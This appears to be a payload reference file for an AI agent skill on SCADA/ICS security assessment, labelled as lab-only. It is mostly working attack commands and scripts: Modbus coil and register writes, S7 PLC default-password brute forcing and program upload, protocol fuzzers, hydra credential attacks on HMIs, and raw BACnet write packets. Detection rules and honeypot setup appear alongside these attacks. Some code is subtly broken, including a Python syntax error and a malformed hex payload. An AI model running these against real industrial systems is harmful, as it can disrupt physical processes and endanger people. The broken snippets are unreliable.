# Payloads: SCADA/ICS Security Assessment

> This file is a companion to `SKILL.md`, containing ICS protocol attack payloads and command references for authorized security assessment in lab environments only.

---

## 1. Modbus Attacks

### Modbus Device Discovery

```bash
# Scan for Modbus TCP devices on port 502
nmap -p 502 --script modbus-discover 192.168.1.0/24

# Quick Modbus banner grab across a subnet
nmap -sT -p 502 -sV --version-intensity 5 192.168.1.0/24

# Masscan for Modbus TCP at high speed (lab only)
masscan 192.168.1.0/24 -p502 --rate=1000
```

### Modbus Register Reading

```bash
# Read 10 holding registers starting at address 0 from slave ID 1
modbus-cli read -a 192.168.1.10 -p 502 -s 1 -r 0 -n 10 -t holding

# Read input registers (read-only sensor data)
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 20 -t input

# Read coil status (digital outputs)
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 8 -t coil

# Read discrete inputs (digital inputs)
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 8 -t discrete

# Use mbpoll to continuously poll holding registers every 1 second
mbpoll -t 192.168.1.10 -p 502 -m tcp -r 100 -c 10 -1 1000
```

### Modbus Register Writing (Lab Only)

```bash
# Write a single value to holding register at address 0
modbus-cli write -a 192.168.1.10 -s 1 -r 0 -v 100 -t holding

# Write multiple values to consecutive holding registers
modbus-cli write -a 192.168.1.10 -s 1 -r 10 -v 200,300,400 -t holding

# Write to a single coil (force digital output ON)
modbus-cli write -a 192.168.1.10 -s 1 -r 0 -v 1 -t coil

# Force all coils OFF using mbpoll
mbpoll -t 192.168.1.10 -p 502 -m tcp -r 0 -c 8 -0

# Force a coil ON at address 5
mbpoll -t 192.168.1.10 -p 502 -m tcp -r 5 -1
```

### Modbus Slave ID Enumeration

```bash
# Enumerate valid slave IDs by attempting to read from each
for i in $(seq 1 247); do
  timeout 2 modbus-cli read -a 192.168.1.10 -s $i -r 0 -n 1 -t holding 2>/dev/null && echo "Slave $i: ACTIVE"
done

# Scan for slave IDs using nmap modbus script
nmap -p 502 --script modbus-discover --script-args modbus-discover.unitid=1-247 192.168.1.10
```

---

## 2. S7comm / Siemens Attacks

### Siemens PLC Discovery

```bash
# Scan a subnet for Siemens S7 PLCs
s7scan -t 192.168.1.0/24

# Scan with extended timeout for slow networks
s7scan -t 192.168.1.0/24 -T 10

# Target a specific PLC for detailed enumeration
s7scan -t 192.168.1.20

# Use plcscan for broader PLC discovery (not Siemens-specific)
plcscan -i 192.168.1.0/24 -t 5
```

### S7comm SZL (System Status List) Reading

```bash
# Read module identification (SZL 0x0011)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
szl = c.read_szl(0x0011)
print(szl)
c.disconnect()
"

# Read component identification (SZL 0x001C)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
szl = c.read_szl(0x001C)
for item in szl.items:
    print(f'Index: {item.Index}, Data: {item.Data.hex()}')
c.disconnect()
"

# Read protection level status (SZL 0x0232)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
szl = c.read_szl(0x0232)
print('Protection level:', szl.items[0].Data[0] if szl.items else 'Unknown')
c.disconnect()
"
```

### S7comm Memory Operations

```bash
# Read a block from PLC data block DB1
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
data = c.db_read(1, 0, 64)
print('DB1 data:', data.hex())
c.disconnect()
"

# List all blocks in the PLC
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
blocks = c.list_blocks()
for b in blocks:
    print(f'Type: {b.blktype}, Number: {b.blknumber}')
c.disconnect()
"

# Read PLC operating mode
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
state = c.get_cpu_state()
print(f'CPU State: {state}')
c.disconnect()
"
```

### S7comm Protocol Fuzzing

```bash
# Fuzz S7comm with csric
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz

# Target specific S7comm function codes with csric
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz --function 0x04

# Capture S7comm traffic during fuzzing for analysis
tcpdump -i eth0 -w s7comm_fuzz.pcap port 102 &
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz
```

---

## 3. EtherNet/IP Attacks

### EtherNet/IP Device Discovery

```bash
# List all EtherNet/IP devices on the network using CIP identity
enip-client -i 192.168.1.0/24 --list-identity

# Enumerate with extended timeout
enip-client -i 192.168.1.0/24 --list-identity --timeout 5

# Target a specific device for detailed enumeration
enip-client -t 192.168.1.30 --list-identity
```

### EtherNet/IP Session and Attribute Operations

```bash
# Register an EtherNet/IP session with a target device
enip-client -t 192.168.1.30 --register-session

# Read CIP identity object (class 0x01, instance 0x01)
enip-client -t 192.168.1.30 --read-attribute --class 0x01 --instance 0x01 --attribute 0x01

# Enumerate all CIP classes supported by the device
enip-client -t 192.168.1.30 --list-classes

# Read device attributes (vendor, product name, serial)
enip-client -t 192.168.1.30 --get-attribute-all --class 0x01 --instance 0x01

# Forward open an implicit messaging connection
enip-client -t 192.168.1.30 --forward-open --timeout-multiplier 5
```

### EtherNet/IP Network Scanning

```bash
# nmap scan for EtherNet/IP devices on port 44818
nmap -p 44818 --script enip-info 192.168.1.0/24

# Masscan for quick EtherNet/IP discovery
masscan 192.168.1.0/24 -p44818 --rate=500

# Capture EtherNet/IP traffic for offline analysis
tcpdump -i eth0 -w enip_traffic.pcap port 44818
```

---

## 4. OPC UA Operations

### OPC UA Server Discovery

```bash
# Discover OPC UA servers on the network using discovery service
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
client.connect()
print('Connected to:', client.get_server_node().get_value())
client.disconnect()
"

# Enumerate all OPC UA endpoints and their security policies
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
endpoints = client.get_endpoints()
for ep in endpoints:
    print(f'Endpoint: {ep.EndpointUrl}')
    print(f'Security Mode: {ep.SecurityMode}')
    print(f'Security Policy: {ep.SecurityPolicyUri}')
    print('---')
"
```

### OPC UA Node Exploration

```bash
# Browse the root node and list all child objects
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
client.connect()
root = client.get_root_node()
children = root.get_children()
for child in children:
    print(f'Node: {child.get_browse_name()}, ID: {child.nodeid}')
client.disconnect()
"

# Read all variables under the Objects folder
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
client.connect()
objects = client.get_objects_node()
for node in objects.get_children():
    for var in node.get_variables():
        try:
            val = var.get_value()
            print(f'{var.get_browse_name().Name} = {val}')
        except Exception as e:
            print(f'{var.get_browse_name().Name}: ACCESS DENIED ({e})')
client.disconnect()
"
```

### OPC UA Security Testing

```bash
# Attempt unencrypted connection (security testing)
python3 -c "
import opcua
from opcua import Client
client = Client('opc.tcp://192.168.1.40:4840', timeout=5)
try:
    client.connect()
    print('WARNING: Unencrypted connection accepted!')
    client.disconnect()
except Exception as e:
    print(f'GOOD: Connection rejected: {e}')
"

# Enumerate server certificate details
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
endpoints = client.get_endpoints()
for ep in endpoints:
    if ep.ServerCertificate:
        print(f'Certificate found ({len(ep.ServerCertificate)} bytes)')
        print(f'Server Application: {ep.Server.ApplicationUri}')
client.disconnect()
"

# Write to a writable variable (lab only, assess access controls)
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
client.connect()
var = client.get_node('ns=2;s=Demo.Simulation.WriteDouble')
try:
    old_val = var.get_value()
    var.set_value(99.99)
    new_val = var.get_value()
    print(f'Write test: {old_val} -> {new_val}')
except Exception as e:
    print(f'Write blocked: {e}')
client.disconnect()
"
```

---

## 5. ICS Network Scanning

### Comprehensive ICS Port Scanning

```bash
# Scan for common ICS protocol ports across a subnet
nmap -sT -p 502,102,4840,44818,20000,1080,789,1911,2222 -sV --version-intensity 5 192.168.1.0/24

# Aggressive service detection on discovered ICS ports
nmap -sV --script-args intrusive=1 -p 502,102,4840,44818,20000 192.168.1.0/24

# UDP scan for DNP3 (port 20000) and other UDP-based ICS protocols
sudo nmap -sU --top-ports 20 -p 20000,502,1080 192.168.1.0/24
```

### ICS Traffic Capture and Analysis

```bash
# Capture all ICS protocol traffic on common ports
tcpdump -i eth0 -w ics_all.pcap 'port 502 or port 102 or port 4840 or port 44818 or port 20000'

# Capture Modbus TCP traffic only
tcpdump -i eth0 -w modbus.pcap port 502

# Real-time Modbus function code extraction
tshark -i eth0 -f "port 502" -T fields -e modbus.funccode -e ip.src -e ip.dst

# Capture and display S7comm communication
tshark -i eth0 -f "port 102" -Y "s7comm" -T fields -e s7comm.func -e ip.src -e ip.dst

# Capture EtherNet/IP encapsulation layer
tshark -i eth0 -f "port 44818" -Y "enip" -T fields -e enip.command -e ip.src
```

### Honeypot Deployment

```bash
# Deploy conpot with default Modbus template
conpot -f --template default

# Deploy conpot with a specific template on a custom IP
conpot -f --template kemel --host 192.168.1.200

# Run conpot with a custom configuration
conpot -f --template default --config /etc/conpot/conpot.cfg

# Deploy conpot with logging to syslog
conpot -f --template default --logfile /var/log/conpot.log

# Run conpot in the background and monitor connections
conpot -f --template default &
tail -f /var/log/conpot.log
```

### Protocol Fuzzing with csric

```bash
# Fuzz Modbus TCP protocol
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz

# Fuzz DNP3 protocol
csric -t 192.168.1.15 -p 20000 -P dnp3 -f fuzz

# Fuzz with specific seed and iteration count
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --seed 42 --iterations 500

# Fuzz and capture crash-inducing packets
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --output fuzz_results/
```

### BACnet Device Discovery

```bash
# Discover BACnet devices using nmap
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24

# Capture BACnet traffic
tcpdump -i eth0 -w bacnet.pcap udp port 47808

# Analyze BACnet device communications
tshark -r bacnet.pcap -Y "bacnet" -T fields -e bacnet.apdu.service -e ip.src
```

### DNP3 Outstation Enumeration

```bash
# Scan for DNP3 outstations on TCP port 20000
nmap -sT -p 20000 --script dnp3-info 192.168.1.0/24

# Capture DNP3 traffic for passive analysis
tcpdump -i eth0 -w dnp3.pcap port 20000

# Analyze DNP3 function codes in captured traffic
tshark -r dnp3.pcap -Y "dnp3" -T fields -e dnp3.func -e ip.src -e ip.dst

# Enumerate DNP3 data objects using scapy (custom script)
python3 -c "
from scapy.all import *
conf.L3socket = L3RawSocket
# Craft a DNP3 read request for class 0 data
dnp3_read = IP(dst='192.168.1.15')/TCP(dport=20000, flags='PA')/Raw(load=bytes.fromhex('056405c30000000401'))
ans = sr1(dnp3_read, timeout=5, verbose=0)
if ans:
    print('DNP3 response:', bytes(ans[Raw]).hex())
else:
    print('No response')
"
```

### GOOSE and IEC 61850 Analysis

```bash
# Capture GOOSE multicast traffic on the ICS VLAN
tcpdump -i eth0 -w goose.pcap ether proto 0x88b8

# Parse GOOSE messages with tshark
tshark -i eth0 -Y "goose" -T fields -e goose.goID -e goose.goRef -e goose.stNum -e goose.sqNum

# Capture IEC 61850 MMS traffic on TCP port 102
tcpdump -i eth0 -w iec61850_mms.pcap port 102

# Analyze IEC 61850 ACSI association requests
tshark -r iec61850_mms.pcap -Y "mms" -T fields -e mms.service -e ip.src -e ip.dst
```

### ICS Protocol Rainbow Table and Default Credential Testing

```bash
# Test Siemens S7 default communication passwords using snap7
python3 -c "
from snap7.client import Client
passwords = ['00000000', 'SYSTEM', 'S7', 'ADMIN', 'PASS']
c = Client()
for pwd in passwords:
    try:
        c.set_connection_type(1)
        c.connect('192.168.1.20', 0, 1)
        c.set_session_password(pwd.encode())
        szl = c.read_szl(0x0011)
        print(f'SUCCESS: Password {pwd} accepted')
        c.disconnect()
        break
    except Exception as e:
        print(f'Failed: {pwd} ({e})')
        c.disconnect()
"

# Enumerate OPC UA nodes that allow anonymous write access
python3 -c "
import opcua
client = opcua.Client('opc.tcp://192.168.1.40:4840')
client.connect()
objects = client.get_objects_node()
for node in objects.get_children():
    for var in node.get_variables():
        try:
            old_val = var.get_value()
            var.set_value(old_val)
            print(f'WRITABLE: {var.get_browse_name().Name} (type: {type(old_val).__name__})')
        except Exception:
            pass
client.disconnect()
"
```

### ICS Protocol Traffic Replay and Analysis

```bash
# Replay captured Modbus traffic to test device behavior
tcpreplay -i eth0 --loop=10 captured_modbus.pcap

# Extract unique Modbus function codes seen in traffic
tshark -r ics_all.pcap -Y "tcp.port == 502 && modbus" -T fields -e modbus.funccode | sort | uniq -c | sort -rn

# Identify Modbus master-slave communication pairs and polling intervals
tshark -r ics_all.pcap -Y "tcp.port == 502 && modbus.funccode == 3" -T fields -e ip.src -e ip.dst -e frame.time_delta_displayed | head -50
```

### Conpot Honeypot Monitoring and Alert Integration

```bash
# Start conpot with JSON logging for SIEM integration
conpot -f --template default --logfile /var/log/conpot.json --logconfig /etc/conpot/logging.json

# Parse conpot JSON logs for Modbus interaction alerts
jq 'select(.remote[0] != null) | {time: .timestamp, src_ip: .remote[0], protocol: .data_type, data: .data}' /var/log/conpot.json

# Monitor conpot connections in real-time with grep alerts
tail -f /var/log/conpot.log | while read line; do
  echo "$line" | grep -i "connect" && echo "ALERT: New connection to honeypot at $(date)"
done
```

### Scapy-Based ICS Protocol Crafted Packets

```bash
# Craft a custom Modbus read holding registers request with scapy
python3 -c "
from scapy.all import *
# Modbus TCP read holding registers (FC=03, start=0, quantity=10)
modbus_pdu = bytes.fromhex('00010000000501030000000a')
sendp(Ether()/IP(dst='192.168.1.10')/TCP(dport=502, flags='PA')/Raw(load=modbus_pdu), iface='eth0', verbose=0)
print('Custom Modbus packet sent')
"

# Craft an EtherNet/IP ListIdentity request
python3 -c "
from scapy.all import *
# ENIP ListIdentity command (0x63)
enip_pdu = bytes.fromhex('00000000650004000000000000000000')
ans = sr1(IP(dst='192.168.1.30')/TCP(dport=44818, flags='PA')/Raw(load=enip_pdu), timeout=5, verbose=0)
if ans and ans.haslayer(Raw):
    print('ENIP response:', bytes(ans[Raw]).hex())
else:
    print('No response')
"
```

---

## 6. DNP3 Protocol Attacks

### DNP3 Outstation Discovery and Interaction

```bash
# Scan for DNP3 outstations on TCP port 20000
nmap -sT -p 20000 --script dnp3-info 192.168.1.0/24

# Read DNP3 analog input points using scapy
python3 -c "
from scapy.all import *
# DNP3 read request (function code 0x01) for class 0 data
dnp3_request = bytes.fromhex('056405c30000000401')
ans = sr1(IP(dst='192.168.1.15')/TCP(dport=20000, flags='PA')/Raw(load=dnp3_request), timeout=5, verbose=0)
if ans and ans.haslayer(Raw):
    print('DNP3 response:', bytes(ans[Raw]).hex())
"

# Capture DNP3 traffic for passive analysis
tcpdump -i eth0 -w dnp3_traffic.pcap port 20000

# Analyze DNP3 function codes
tshark -r dnp3_traffic.pcap -Y "dnp3" -T fields -e dnp3.func -e ip.src -e ip.dst
```

### DNP3 Protocol Fuzzing

```bash
# Fuzz DNP3 protocol with csric
csric -t 192.168.1.15 -p 20000 -P dnp3 -f fuzz --iterations 500

# DNP3 specific function code fuzzing
csric -t 192.168.1.15 -p 20000 -P dnp3 -f fuzz --function 0x01

# Capture crash-inducing packets during fuzzing
tcpdump -i eth0 -w dnp3_fuzz.pcap port 20000 &
csric -t 192.168.1.15 -p 20000 -P dnp3 -f fuzz
```

---

## 7. BACnet Building Automation Attacks

### BACnet Device Discovery and Enumeration

```bash
# Discover BACnet devices using nmap
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24

# Capture BACnet broadcast traffic
tcpdump -i eth0 -w bacnet_broadcast.pcap udp port 47808

# Read BACnet device object properties
python3 -c "
from scapy.all import *
# BACnet ReadProperty request for device object (object-type=8, instance=1, property=85)
# Property 85 = protocol-services-supported
bacnet_pdu = bytes.fromhex('810a001501040005010c0c0221ff008044219148')
sendp(Ether()/IP(dst='192.168.1.50')/UDP(dport=47808)/Raw(load=bacnet_pdu), iface='eth0', verbose=0)
"

# Enumerate BACnet objects on a device
tshark -i eth0 -f "udp port 47808" -Y "bacnet" -T fields -e bacnet.apdu.service -e ip.src
```

### BACnet Write Operation Testing

```bash
# Write to BACnet analog output (lab only)
python3 -c "
from scapy.all import *
# BACnet WriteProperty to analog output (type=1, instance=1, property=85=present-value)
# WARNING: Lab environment only
bacnet_write = bytes.fromhex('810a00180104000501100c0c0221ff00002e4400553c0000000')
sendp(Ether()/IP(dst='192.168.1.50')/UDP(dport=47808)/Raw(load=bacnet_write), iface='eth0', verbose=0)
print('BACnet write command sent (lab only)')
"
```

---

## 8. IEC 61850 and GOOSE Protocol Analysis

### GOOSE Message Capture and Analysis

```bash
# Capture GOOSE multicast messages (Layer 2 protocol, ethertype 0x88B8)
tcpdump -i eth0 -w goose_capture.pcap ether proto 0x88b8

# Parse GOOSE messages in real-time
tshark -i eth0 -Y "goose" -T fields \
  -e goose.goID -e goose.goRef -e goose.stNum -e goose.sqNum -e goose.time

# Identify GOOSE publisher MAC addresses and GOIDs
tshark -r goose_capture.pcap -Y "goose" -T fields \
  -e eth.src -e goose.goID -e goose.goRef | sort -u

# Monitor GOOSE state transitions (stNum increments indicate events)
tshark -i eth0 -Y "goose" -T fields -e goose.goID -e goose.stNum -e goose.time
```

### IEC 61850 MMS Protocol Testing

```bash
# Capture MMS (Manufacturing Message Specification) over TCP port 102
tcpdump -i eth0 -w iec61850_mms.pcap port 102

# Analyze MMS service requests
tshark -r iec61850_mms.pcap -Y "mms" -T fields -e mms.service -e ip.src -e ip.dst

# Identify IEC 61850 logical device names from MMS traffic
tshark -r iec61850_mms.pcap -Y "mms" -T fields -e mms.itemID | sort -u | head -20

# Monitor for unauthorized MMS write operations
tshark -i eth0 -Y "mms && mms.service==Write" -T fields -e ip.src -e mms.itemID
```

---

## 9. ICS Incident Response and Monitoring

### ICS Network Baseline Capture

```bash
# Capture comprehensive ICS baseline traffic for 1 hour
timeout 3600 tcpdump -i eth0 -w ics_baseline_$(date +%Y%m%d_%H%M).pcap \
  'port 502 or port 102 or port 4840 or port 44818 or port 20000 or port 47808 or ether proto 0x88b8'

# Extract protocol distribution from baseline capture
tshark -r ics_baseline.pcap -T fields -e frame.protocols | sort | uniq -c | sort -rn | head -20

# Identify Modbus master-slave communication patterns
tshark -r ics_baseline.pcap -Y "modbus" -T fields -e ip.src -e ip.dst -e modbus.funccode | sort | uniq -c | sort -rn

# Generate Modbus traffic summary for anomaly detection
tshark -r ics_baseline.pcap -Y "tcp.port==502" -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn
```

### ICS-Specific IDS Rule Development

```bash
# Create Snort/Suricata rule for unauthorized Modbus write detection
cat > /etc/suricata/rules/ics.rules << 'EOF'
# Alert on Modbus write operations (function codes 5, 6, 15, 16)
alert tcp any any -> any 502 (msg:"ICS Modbus Write Operation Detected"; content:"|00 00 00 00 00|"; depth:5; content:"|05|"; offset:7; depth:1; sid:1000001; rev:1;)
alert tcp any any -> any 502 (msg:"ICS Modbus Write Multiple Registers"; content:"|00 00 00 00 00|"; depth:5; content:"|10|"; offset:7; depth:1; sid:1000002; rev:1;)

# Alert on unauthorized S7comm PLC stop command
alert tcp any any -> any 102 (msg:"ICS S7comm PLC Stop Command"; content:"|02|"; offset:0; depth:1; content:"|29|"; offset:17; depth:1; sid:1000003; rev:1;)

# Alert on EtherNet/IP session from unknown source
alert tcp !$HOME_NET any -> any 44818 (msg:"ICS EtherNet/IP External Connection Attempt"; flow:to_server; content:"|65 00|"; offset:0; depth:2; sid:1000004; rev:1;)
EOF

# Test rules against captured traffic
suricata -r ics_baseline.pcap -c /etc/suricata/suricata.yaml -l /tmp/ics_ids_test/
```

---

## 10. HART and WirelessHART Protocol Testing

### HART Protocol Device Discovery

```bash
# Scan for HART devices on serial/USB interface
hartcomm -d /dev/ttyUSB0 -b 1200 scan

# Read HART device primary variable
hartcomm -d /dev/ttyUSB0 -a 0 read-pv

# Read HART device diagnostic information
hartcomm -d /dev/ttyUSB0 -a 0 read-diagnostics

# Enumulate HART long frame address
hartcomm -d /dev/ttyUSB0 -a 38 read-pv
```

### WirelessHART Capture

```bash
# Capture WirelessHART traffic (IEEE 802.15.4, channel 11-25)
# Using compatible 802.15.4 sniffer hardware
tcpdump -i wpan0 -w wirelesshart.pcap

# Analyze WirelessHART frames
tshark -r wirelesshart.pcap -Y "wpan" -T fields -e wpan.dst64 -e wpan.src64 -e frame.len

# Monitor for join requests (new device enrollment)
tshark -r wirelesshart.pcap -Y "wpan && wpan.frametype==1" -T fields -e wpan.src64
```

---

## 11. Modbus Protocol Deep Analysis

### Modbus Function Code Analysis

```bash
# Extract all Modbus function codes from capture
tshark -r modbus.pcap -Y "modbus" -T fields -e modbus.funccode | sort | uniq -c | sort -rn

# Identify write operations (FC 5,6,15,16) in Modbus traffic
tshark -r modbus.pcap -Y "modbus.funccode >= 5 && modbus.funccode <= 16" \
  -T fields -e ip.src -e ip.dst -e modbus.funccode -e modbus.regval16

# Monitor for abnormal Modbus exception responses
tshark -r modbus.pcap -Y "modbus.funccode > 0x80" -T fields -e ip.src -e ip.dst -e modbus.funccode
```

### PLC Firmware Analysis

```bash
# Extract PLC firmware version from S7comm traffic
tshark -r s7comm_capture.pcap -Y "s7comm" -T fields -e s7comm.param.func -e s7comm.data.returncode | sort -u

# Identify PLC model and firmware from device response
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
szl = c.read_szl(0x0011, 0x0001)
for item in szl.items:
    print(f'Module: {item.Data.hex()}')
szl2 = c.read_szl(0x001C)
for item in szl2.items:
    print(f'Component: {item.Data.hex()}')
c.disconnect()
"
```

### ICS Protocol Default Credential Scanner

```bash
# Scan for common ICS device default credentials
# Siemens S7: empty password, SYSTEM, S7
# Modicon: USER,USER or Administrator,Administrator
# Allen-Bradley: default no authentication

# Test Modicon PLC default credentials via FTP
hydra -l USER -p USER ftp://192.168.1.15 -t 1 -W 5
hydra -l Administrator -p Administrator ftp://192.168.1.15 -t 1 -W 5

# Test HMI web interface default credentials
hydra -l admin -P /usr/share/wordlists/dirb/password.txt http-get://192.168.1.50:8080
```

### ICS Network Traffic Anomaly Detection

```bash
# Establish baseline: count Modbus packets per minute
tshark -r ics_baseline.pcap -Y "tcp.port==502" -T fields -e frame.time_relative | \
  awk '{minute=int($1/60); counts[minute]++} END {for(m in counts) print m, counts[m]}' | sort -n

# Detect anomalous Modbus write bursts
tshark -r ics_capture.pcap -Y "modbus && (modbus.funccode==5 || modbus.funccode==6 || modbus.funccode==15 || modbus.funccode==16)" \
  -T fields -e frame.time_relative -e ip.src -e ip.dst

# Identify unusual Modbus slave addresses
tshark -r ics_capture.pcap -Y "modbus" -T fields -e modbus.unitid | sort | uniq -c | sort -rn | head -20
```

### ICS Device Fingerprinting with Nmap

```bash
# Fingerprint specific ICS devices using Nmap NSE scripts
nmap -p 502 --script modbus-discover,modbus-info 192.168.1.10

# Identify BACnet devices and vendor information
nmap -sU -p 47808 --script bacnet-info 192.168.1.50

# Enumerate EtherNet/IP devices with vendor details
nmap -p 44818 --script enip-info 192.168.1.30

# Detect Profinet devices
nmap -p 161 --script snmp-info --script-args snmpcommunity=public 192.168.1.0/24
```

---

## 12. ICS Protocol Fuzzing Automation

### Modbus Fuzzing with Custom Scripts

```python
#!/usr/bin/env python3
"""Custom Modbus TCP fuzzer for authorized ICS testing."""
import socket
import struct
import sys

TARGET_IP = sys.argv[1]
TARGET_PORT = 502

def modbus_packet(unit_id, function_code, data):
    """Construct a Modbus TCP packet."""
    length = len(data) + 2  # unit_id + function_code + data
    header = struct.pack(">HHHBB", 0, 0, length, unit_id, function_code)
    return header + data

def fuzz_function_codes():
    """Fuzz each Modbus function code with random data."""
    for fc in range(1, 127):
        for data_len in [0, 1, 4, 8, 32, 255]:
            data = b"\x00" * data_len  # Could use random bytes
            pkt = modbus_packet(1, fc, data)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((TARGET_IP, TARGET_PORT))
                s.send(pkt)
                resp = s.recv(1024)
                exception = resp[7] if len(resp) > 7 else 0
                if exception < 0x80:
                    print(f"FC {fc:#x} data_len={data_len}: ACCEPTED (resp={exception:#x})")
                s.close()
            except Exception as e:
                print(f"FC {fc:#x}: ERROR {e}")

if __name__ == "__main__":
    fuzz_function_codes()
```

### S7comm PLC Memory Read Brute Force

```python
#!/usr/bin/env python3
"""Enumerate PLC memory blocks by brute-forcing block numbers."""
from snap7.client import Client

c = Client()
c.connect('192.168.1.20', 0, 1)

print("Enumerating PLC blocks...")
for block_type in ['DB', 'FB', 'FC', 'OB'):
    for block_num in range(1, 1000):
        try:
            if block_type == 'DB':
                data = c.db_read(block_num, 0, 4)
            print(f"  Found {block_type}{block_num}: {data.hex()}")
        except Exception:
            pass

c.disconnect()
```

### ICS Traffic Baseline Comparison

```bash
# Compare current traffic against baseline for anomaly detection
# Generate baseline statistics
tshark -r ics_baseline.pcap -Y "modbus" -T fields -e modbus.funccode | sort | uniq -c | sort -rn > /tmp/baseline_fc.txt

# Generate current traffic statistics
tshark -r ics_current.pcap -Y "modbus" -T fields -e modbus.funccode | sort | uniq -c | sort -rn > /tmp/current_fc.txt

# Diff to find anomalies
diff /tmp/baseline_fc.txt /tmp/current_fc.txt
```

---

## 13. ICS Security Assessment Report Generation

### Automated ICS Assessment Script

```bash
#!/bin/bash
# Automated ICS security assessment report generator
TARGET_SUBNET="$1"
REPORT="/tmp/ics_assessment_$(date +%Y%m%d).txt"

echo "=== ICS Security Assessment ===" | tee "$REPORT"
echo "Target: $TARGET_SUBNET" | tee -a "$REPORT"
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$REPORT"

echo "[1] ICS Protocol Discovery" | tee -a "$REPORT"
nmap -sT -sV -p 502,102,4840,44818,20000,47808 "$TARGET_SUBNET" | tee -a "$REPORT"

echo "[2] Modbus Device Enumeration" | tee -a "$REPORT"
nmap -p 502 --script modbus-discover "$TARGET_SUBNET" | tee -a "$REPORT"

echo "[3] EtherNet/IP Discovery" | tee -a "$REPORT"
nmap -p 44818 --script enip-info "$TARGET_SUBNET" | tee -a "$REPORT"

echo "Report saved to: $REPORT"
```

### ICS Vulnerability Rating Guide

```bash
# Generate ICS-specific CVSS ratings for common findings
python3 << 'PYEOF'
ics_findings = [
    ("Unauthenticated Modbus TCP access", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8),
    ("Default PLC communication password", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8),
    ("Unencrypted OPC UA connection", "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N", 4.8),
    ("PLC firmware outdated", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H", 8.1),
]
print("| Finding | CVSS Vector | Score |")
print("|---------|-------------|-------|")
for name, vector, score in ics_findings:
    print(f"| {name} | {vector} | {score} |")
PYEOF
```

### Conpot Honeypot Customization

```bash
# Customize conpot honeypot template for specific ICS environment
# Edit template configuration
cat > /tmp/custom_conpot.xml << 'EOF'
<configuration>
  <slave id="1">
    <hostname>PLC-CONTROLLER-01</hostname>
    <mac>00:01:02:03:04:05</mac>
    <ip>192.168.1.10</ip>
    <protocol>modbus</protocol>
  </slave>
</configuration>
EOF
conpot -f --template /tmp/custom_conpot.xml --host 192.168.1.200
```

### PLC Program Extraction and Analysis

```bash
# Extract PLC program logic using snap7
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
blocks = c.list_blocks()
for b in blocks:
    print(f'Type: {b.blktype}, Number: {b.blknumber}')
    block_data = c.upload(b.blktype, b.blknumber)
    print(f'  Size: {len(block_data)} bytes')
c.disconnect()
"
```

### HMI Web Interface Testing

```bash
# Scan HMI web interface for vulnerabilities
nmap -sT -p 80,443,8080 --script http-enum,http-auth,http-default-accounts 192.168.1.50

# Test HMI for default credentials
hydra -l admin -P /usr/share/wordlists/dirb/password.txt http-get://192.168.1.50:8080
```

### ICS Protocol Port Reference

```bash
echo "Modbus TCP:502 S7comm:102 OPC-UA:4840 EtherNet/IP:44818 DNP3:20000 BACnet:47808 GOOSE:Eth0x88B8"
```

### ICS Protocol Deep Inspection

```bash
# Capture and decode ICS protocol traffic with display filters
tshark -i eth0 -f "port 502 or port 20000 or port 4840" \
  -Y "modbus || s7comm || bacapp || enip" \
  -T fields -e frame.time -e ip.src -e ip.dst -e modbus.funccode -e s7comm.param_func \
  2>/dev/null | tee /tmp/ics_protocol_audit.log
```

### PLC Program Comparison and Diff

```bash
# Compare two PLC program dumps for unauthorized changes
diff <(strings plc_backup_v1.bin | sort) <(strings plc_current.bin | sort) > /tmp/plc_diff.txt
echo "[+] Differences found: $(grep -c '^<' /tmp/plc_diff.txt) additions, $(grep -c '^>' /tmp/plc_diff.txt) removals"
```
